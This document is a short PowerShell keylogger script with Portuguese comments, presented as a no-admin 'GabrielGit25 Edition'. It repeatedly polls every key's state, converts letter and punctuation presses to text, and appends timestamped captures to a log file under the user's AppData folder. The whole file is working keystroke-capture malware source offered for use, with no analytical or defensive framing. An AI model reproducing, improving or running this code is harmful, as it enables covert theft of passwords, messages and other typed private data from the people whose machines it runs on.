# Keylogger LEGÍVEL - GabrielGit25 Edition (SEM ADMIN!)
param($LogPath="$env:USERPROFILE\AppData\Local\keys-readable.log")

# Pasta do usuário (sem admin)
$dir = Split-Path $LogPath -Parent
if (!(Test-Path $dir)) { New-Item -Path $dir -ItemType Directory -Force | Out-Null }

# Mapeia teclas → letras
$map = @{
    65='a'; 66='b'; 67='c'; 68='d'; 69='e'; 70='f'; 71='g'; 72='h'; 73='i'; 74='j'; 75='k'; 76='l'; 77='m';
    78='n'; 79='o'; 80='p'; 81='q'; 82='r'; 83='s'; 84='t'; 85='u'; 86='v'; 87='w'; 88='x'; 89='y'; 90='z';
    186=';'; 188=','; 189='-'; 190='.'; 191='/'; 219='['; 221=']'; 220='\'; 222="'"; 32=' '
}

Add-Type -AssemblyName System.Windows.Forms

Write-Host "🔍 KEYLOGGER LEGÍVEL ATIVO (USUÁRIO)!" -ForegroundColor Red
Write-Host "📝 Salvando em: $LogPath" -ForegroundColor Yellow
Write-Host "🛑 Ctrl+C para parar" -ForegroundColor Green

$buffer = ""
$pressed = @{}

try {
    while($true) {
        for($i = 8; $i -le 254; $i++) {
            $key = [System.Windows.Forms.Keys]$i
            $state = [System.Windows.Forms.Control]::IsKeyDown($key)
            
            if($state -and $map[$i] -and !$pressed[$i]) {
                $char = $map[$i]
                $buffer += $char
                
                if($buffer.Length -ge 8 -or $i -eq 13) {  # Enter = 13
                    if($buffer.Trim() -ne "") {
                        $timestamp = Get-Date -Format "HH:mm:ss"
                        "$timestamp → $buffer" | Out-File $LogPath -Append -Encoding UTF8
                        Write-Host "📝 Capturado: $buffer" -ForegroundColor Cyan
                    }
                    $buffer = ""
                }
            }
            $pressed[$i] = $state
        }
        Start-Sleep -Milliseconds 50
    }
} catch {
    Write-Host "Parado (Ctrl+C)" -ForegroundColor Yellow
}
